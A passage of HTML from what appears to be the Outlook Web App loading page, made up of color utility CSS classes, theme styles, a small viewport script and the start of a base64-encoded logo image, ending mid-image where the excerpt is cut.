08c}.ms-bg-color-purpleDark,.ms-bgc-pd,.ms-bg-color-purpleDark-hover:hover,.ms-bg-color-purpleDark-before:before,.ms-bgc-pd-h:hover,.ms-bgc-pd-b:before{background-color:#32145a}.ms-bg-color-purple,.ms-bgc-p,.ms-bg-color-purple-hover:hover,.ms-bg-color-purple-before:before,.ms-bgc-p-h:hover,.ms-bgc-p-b:before{background-color:#5c2d91}.ms-bg-color-purpleLight,.ms-bgc-pl,.ms-bg-color-purpleLight-hover:hover,.ms-bg-color-purpleLight-before:before,.ms-bgc-pl-h:hover,.ms-bgc-pl-b:before{background-color:#b4a0ff}.ms-bg-color-blueDark,.ms-bgc-bd,.ms-bg-color-blueDark-hover:hover,.ms-bg-color-blueDark-before:before,.ms-bgc-bd-h:hover,.ms-bgc-bd-b:before{background-color:#002050}.ms-bg-color-blueMid,.ms-bgc-bm,.ms-bg-color-blueMid-hover:hover,.ms-bg-color-blueMid-before:before,.ms-bgc-bm-h:hover,.ms-bgc-bm-b:before{background-color:#00188f}.ms-bg-color-blue,.ms-bgc-blu,.ms-bg-color-blue-hover:hover,.ms-bg-color-blue-before:before,.ms-bgc-blu-h:hover,.ms-bgc-blu-b:before{background-color:#0078d7}.ms-bg-color-blueLight,.ms-bgc-bl,.ms-bg-color-blueLight-hover:hover,.ms-bg-color-blueLight-before:before,.ms-bgc-bl-h:hover,.ms-bgc-bl-b:before{background-color:#00bcf2}.ms-bg-color-tealDark,.ms-bgc-ted,.ms-bg-color-tealDark-hover:hover,.ms-bg-color-tealDark-before:before,.ms-bgc-ted-h:hover,.ms-bgc-ted-b:before{background-color:#004b50}.ms-bg-color-teal,.ms-bgc-t,.ms-bg-color-teal-hover:hover,.ms-bg-color-teal-before:before,.ms-bgc-t-h:hover,.ms-bgc-t-b:before{background-color:#008272}.ms-bg-color-tealLight,.ms-bgc-tel,.ms-bg-color-tealLight-hover:hover,.ms-bg-color-tealLight-before:before,.ms-bgc-tel-h:hover,.ms-bgc-tel-b:before{background-color:#00b294}.ms-bg-color-greenDark,.ms-bgc-gd,.ms-bg-color-greenDark-hover:hover,.ms-bg-color-greenDark-before:before,.ms-bgc-gd-h:hover,.ms-bgc-gd-b:before{background-color:#004b1c}.ms-bg-color-green,.ms-bgc-g,.ms-bg-color-green-hover:hover,.ms-bg-color-green-before:before,.ms-bgc-g-h:hover,.ms-bgc-g-b:before{background-color:#107c10}.ms-bg-color-greenLight,.ms-bgc-gl,.ms-bg-color-greenLight-hover:hover,.ms-bg-color-greenLight-before:before,.ms-bgc-gl-h:hover,.ms-bgc-gl-b:before{background-color:#bad80a}.ms-border-color-yellow,.ms-bcl-y,.ms-border-color-yellow-hover:hover,.ms-border-color-yellow-before:before,.ms-bcl-y-h:hover,.ms-bcl-y-b:before{border-color:#ffb900}.ms-border-color-yellowLight,.ms-bcl-yl,.ms-border-color-yellowLight-hover:hover,.ms-border-color-yellowLight-before:before,.ms-bcl-yl-h:hover,.ms-bcl-yl-b:before{border-color:#fff100}.ms-border-color-orange,.ms-bcl-o,.ms-border-color-orange-hover:hover,.ms-border-color-orange-before:before,.ms-bcl-o-h:hover,.ms-bcl-o-b:before{border-color:#d83b01}.ms-border-color-orangeLight,.ms-bcl-ol,.ms-border-color-orangeLight-hover:hover,.ms-border-color-orangeLight-before:before,.ms-bcl-ol-h:hover,.ms-bcl-ol-b:before{border-color:#ff8c00}.ms-border-color-redDark,.ms-bcl-rd,.ms-border-color-redDark-hover:hover,.ms-border-color-redDark-before:before,.ms-bcl-rd-h:hover,.ms-bcl-rd-b:before{border-color:#a80000}.ms-border-color-red,.ms-bcl-r,.ms-border-color-red-hover:hover,.ms-border-color-red-before:before,.ms-bcl-r-h:hover,.ms-bcl-r-b:before{border-color:#e81123}.ms-border-color-magentaDark,.ms-bcl-md,.ms-border-color-magentaDark-hover:hover,.ms-border-color-magentaDark-before:before,.ms-bcl-md-h:hover,.ms-bcl-md-b:before{border-color:#5c005c}.ms-border-color-magenta,.ms-bcl-m,.ms-border-color-magenta-hover:hover,.ms-border-color-magenta-before:before,.ms-bcl-m-h:hover,.ms-bcl-m-b:before{border-color:#b4009e}.ms-border-color-magentaLight,.ms-bcl-ml,.ms-border-color-magentaLight-hover:hover,.ms-border-color-magentaLight-before:before,.ms-bcl-ml-h:hover,.ms-bcl-ml-b:before{border-color:#e3008c}.ms-border-color-purpleDark,.ms-bcl-pd,.ms-border-color-purpleDark-hover:hover,.ms-border-color-purpleDark-before:before,.ms-bcl-pd-h:hover,.ms-bcl-pd-b:before{border-color:#32145a}.ms-border-color-purple,.ms-bcl-p,.ms-border-color-purple-hover:hover,.ms-border-color-purple-before:before,.ms-bcl-p-h:hover,.ms-bcl-p-b:before{border-color:#5c2d91}.ms-border-color-purpleLight,.ms-bcl-pl,.ms-border-color-purpleLight-hover:hover,.ms-border-color-purpleLight-before:before,.ms-bcl-pl-h:hover,.ms-bcl-pl-b:before{border-color:#b4a0ff}.ms-border-color-blueDark,.ms-bcl-bd,.ms-border-color-blueDark-hover:hover,.ms-border-color-blueDark-before:before,.ms-bcl-bd-h:hover,.ms-bcl-bd-b:before{border-color:#002050}.ms-border-color-blueMid,.ms-bcl-bm,.ms-border-color-blueMid-hover:hover,.ms-border-color-blueMid-before:before,.ms-bcl-bm-h:hover,.ms-bcl-bm-b:before{border-color:#00188f}.ms-border-color-blue,.ms-bcl-blu,.ms-border-color-blue-hover:hover,.ms-border-color-blue-before:before,.ms-bcl-blu-h:hover,.ms-bcl-blu-b:before{border-color:#0078d7}.ms-border-color-blueLight,.ms-bcl-bl,.ms-border-color-blueLight-hover:hover,.ms-border-color-blueLight-before:before,.ms-bcl-bl-h:hover,.ms-bcl-bl-b:before{border-color:#00bcf2}.ms-border-color-tealDark,.ms-bcl-ted,.ms-border-color-tealDark-hover:hover,.ms-border-color-tealDark-before:before,.ms-bcl-ted-h:hover,.ms-bcl-ted-b:before{border-color:#004b50}.ms-border-color-teal,.ms-bcl-t,.ms-border-color-teal-hover:hover,.ms-border-color-teal-before:before,.ms-bcl-t-h:hover,.ms-bcl-t-b:before{border-color:#008272}.ms-border-color-tealLight,.ms-bcl-tel,.ms-border-color-tealLight-hover:hover,.ms-border-color-tealLight-before:before,.ms-bcl-tel-h:hover,.ms-bcl-tel-b:before{border-color:#00b294}.ms-border-color-greenDark,.ms-bcl-gd,.ms-border-color-greenDark-hover:hover,.ms-border-color-greenDark-before:before,.ms-bcl-gd-h:hover,.ms-bcl-gd-b:before{border-color:#004b1c}.ms-border-color-green,.ms-bcl-g,.ms-border-color-green-hover:hover,.ms-border-color-green-before:before,.ms-bcl-g-h:hover,.ms-bcl-g-b:before{border-color:#107c10}.ms-border-color-greenLight,.ms-bcl-gl,.ms-border-color-greenLight-hover:hover,.ms-border-color-greenLight-before:before,.ms-bcl-gl-h:hover,.ms-bcl-gl-b:before{border-color:#bad80a}.ms-font-color-yellow,.ms-fcl-y,.ms-font-color-yellow-hover:hover,.ms-font-color-yellow-before:before,.ms-fcl-y-h:hover,.ms-fcl-y-b:before{color:#ffb900}.ms-font-color-yellowLight,.ms-fcl-yl,.ms-font-color-yellowLight-hover:hover,.ms-font-color-yellowLight-before:before,.ms-fcl-yl-h:hover,.ms-fcl-yl-b:before{color:#fff100}.ms-font-color-orange,.ms-fcl-o,.ms-font-color-orange-hover:hover,.ms-font-color-orange-before:before,.ms-fcl-o-h:hover,.ms-fcl-o-b:before{color:#d83b01}.ms-font-color-orangeLight,.ms-fcl-ol,.ms-font-color-orangeLight-hover:hover,.ms-font-color-orangeLight-before:before,.ms-fcl-ol-h:hover,.ms-fcl-ol-b:before{color:#ff8c00}.ms-font-color-redDark,.ms-fcl-rd,.ms-font-color-redDark-hover:hover,.ms-font-color-redDark-before:before,.ms-fcl-rd-h:hover,.ms-fcl-rd-b:before{color:#a80000}.ms-font-color-red,.ms-fcl-r,.ms-font-color-red-hover:hover,.ms-font-color-red-before:before,.ms-fcl-r-h:hover,.ms-fcl-r-b:before{color:#e81123}.ms-font-color-magentaDark,.ms-fcl-md,.ms-font-color-magentaDark-hover:hover,.ms-font-color-magentaDark-before:before,.ms-fcl-md-h:hover,.ms-fcl-md-b:before{color:#5c005c}.ms-font-color-magenta,.ms-fcl-m,.ms-font-color-magenta-hover:hover,.ms-font-color-magenta-before:before,.ms-fcl-m-h:hover,.ms-fcl-m-b:before{color:#b4009e}.ms-font-color-magentaLight,.ms-fcl-ml,.ms-font-color-magentaLight-hover:hover,.ms-font-color-magentaLight-before:before,.ms-fcl-ml-h:hover,.ms-fcl-ml-b:before{color:#e3008c}.ms-font-color-purpleDark,.ms-fcl-pd,.ms-font-color-purpleDark-hover:hover,.ms-font-color-purpleDark-before:before,.ms-fcl-pd-h:hover,.ms-fcl-pd-b:before{color:#32145a}.ms-font-color-purple,.ms-fcl-p,.ms-font-color-purple-hover:hover,.ms-font-color-purple-before:before,.ms-fcl-p-h:hover,.ms-fcl-p-b:before{color:#5c2d91}.ms-font-color-purpleLight,.ms-fcl-pl,.ms-font-color-purpleLight-hover:hover,.ms-font-color-purpleLight-before:before,.ms-fcl-pl-h:hover,.ms-fcl-pl-b:before{color:#b4a0ff}.ms-font-color-blueDark,.ms-fcl-bd,.ms-font-color-blueDark-hover:hover,.ms-font-color-blueDark-before:before,.ms-fcl-bd-h:hover,.ms-fcl-bd-b:before{color:#002050}.ms-font-color-blueMid,.ms-fcl-bm,.ms-font-color-blueMid-hover:hover,.ms-font-color-blueMid-before:before,.ms-fcl-bm-h:hover,.ms-fcl-bm-b:before{color:#00188f}.ms-font-color-blue,.ms-fcl-blu,.ms-font-color-blue-hover:hover,.ms-font-color-blue-before:before,.ms-fcl-blu-h:hover,.ms-fcl-blu-b:before{color:#0078d7}.ms-font-color-blueLight,.ms-fcl-bl,.ms-font-color-blueLight-hover:hover,.ms-font-color-blueLight-before:before,.ms-fcl-bl-h:hover,.ms-fcl-bl-b:before{color:#00bcf2}.ms-font-color-tealDark,.ms-fcl-ted,.ms-font-color-tealDark-hover:hover,.ms-font-color-tealDark-before:before,.ms-fcl-ted-h:hover,.ms-fcl-ted-b:before{color:#004b50}.ms-font-color-teal,.ms-fcl-t,.ms-font-color-teal-hover:hover,.ms-font-color-teal-before:before,.ms-fcl-t-h:hover,.ms-fcl-t-b:before{color:#008272}.ms-font-color-tealLight,.ms-fcl-tel,.ms-font-color-tealLight-hover:hover,.ms-font-color-tealLight-before:before,.ms-fcl-tel-h:hover,.ms-fcl-tel-b:before{color:#00b294}.ms-font-color-greenDark,.ms-fcl-gd,.ms-font-color-greenDark-hover:hover,.ms-font-color-greenDark-before:before,.ms-fcl-gd-h:hover,.ms-fcl-gd-b:before{color:#004b1c}.ms-font-color-green,.ms-fcl-g,.ms-font-color-green-hover:hover,.ms-font-color-green-before:before,.ms-fcl-g-h:hover,.ms-fcl-g-b:before{color:#107c10}.ms-font-color-greenLight,.ms-fcl-gl,.ms-font-color-greenLight-hover:hover,.ms-font-color-greenLight-before:before,.ms-fcl-gl-h:hover,.ms-fcl-gl-b:before{color:#bad80a}</style>
        <style>.owa-font-compose{font-family:Calibri,Arial,Helvetica,sans-serif}.owa-bg-color-neutral-orange{background-color:#D82300}.owa-bg-color-neutral-red{background-color:#A80F22}.owa-bg-color-neutral-yellow{background-color:#FFEE94}.owa-bg-color-neutral-green{background-color:#5DD255}.owa-bg-color-cal-green{background-color:#68A490}.owa-bg-color-cal-purple{background-color:#976CBE}.owa-border-color-neutral-orange{border-color:#D82300}.owa-border-color-neutral-red{border-color:#A80F22}.owa-border-color-neutral-yellow{border-color:#FFEE94}.owa-border-color-neutral-green{border-color:#5DD255}.owa-border-color-cal-green{border-color:#68A490}.owa-border-color-cal-purple{border-color:#976CBE}.owa-color-neutral-darkBlue{color:#00008B}.owa-color-neutral-orange{color:#D82300}.owa-color-neutral-red{color:#A80F22}.owa-color-neutral-yellow{color:#FFEE94}.owa-color-neutral-green{color:#5DD255}.owa-color-neutral-green-alt,.owa-color-neutral-green-alt:before{color:#107c10}.owa-color-cal-green{color:#68A490}.owa-color-cal-green-hover{color:#377353}.owa-color-cal-purple{color:#976CBE}.owa-color-cal-purple-hover{color:#67397B}.owa-color-cal-blue{color:#71C2EB}.owa-color-cal-brown{color:#AB9B81}.owa-color-cal-green-alt{color:#A9C47A}.owa-color-cal-grey{color:#999B9C}.owa-color-cal-orange{color:#E6975C}.owa-color-cal-pink{color:#CA6AAB}.owa-color-cal-red{color:#D57272}.owa-color-cal-teal{color:#7BCBC4}.owa-color-cal-yellow{color:#E3B75D}.owa-color-folder-brown{color:#EAC282}.ms-font-color-red{color:#E81123}.ms-font-color-redDark{color:#A80000}</style>

    
        <script>
         var HeaderImageTemplate = ".o365cs-topnavBGImage{background:url('https://r4.res.office365.com/owa/prem/16.2279.14.2549832/resources/themes/@theme/images/0/headerbgmaing2.png'),url('https://r4.res.office365.com/owa/prem/16.2279.14.2549832/resources/themes/@theme/images/0/headerbgmaing2.gif');width:1px;height:1px}";
        </script>
        <style id="HeaderImages"></style>
    

    <script>
        
        (function () {
            if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                var msViewportStyle = document.createElement("style");
                msViewportStyle.appendChild(
                    document.createTextNode("@-ms-viewport{width:auto!important}")
                    );
                document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
            }
        })();
    </script>

    <style>
        body
        {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
        }
 
        #owaLoading
        {
            background-color: #FFF;
            width: 100%;
            height: 100%;
            position: absolute;
            z-index: 10001;
        }
        
        #loadingLogo, #loadingSpinner, #statusText
        {
            display: block;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        
        #loadingLogo
        {
            padding-top: 174px;
            padding-bottom: 22px;
        }
        
        .tnarrow #loadingLogo
        {
            padding-top: 52px;
        }

        #statusText
        {
            color: #0072c6;
            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            font-size: 12px;
            margin-top: 20px;
        }

        #statusText > span
        {
            display: none;
            margin-left: auto;
            margin-right: auto;
            line-height: 11px;
        }

        #statusText.script > .script
        {
            display: inline;
        }

        #statusText.scriptDelay > .scriptDelay
        {
            display: inline;
        }

        #statusText.data > .data
        {
            display: inline;
        }

        #statusText.dataDelay > .dataDelay
        {
            display: inline;
        }

        #statusText.render > .render
        {
            display: inline;
        }
    
    </style>
  </head>
    <!--[if IE 8 ]> <body class="ie8 ms-fwt-r"> <![endif]-->
    <!--[if (gte IE 9)|!(IE)]><!--> <body class="notIE8 ms-fwt-r"> <!--<![endif]-->
    
    <div id="owaLoading">
      <img id="loadingLogo" alt="Outlook" src="data:image/png;base64,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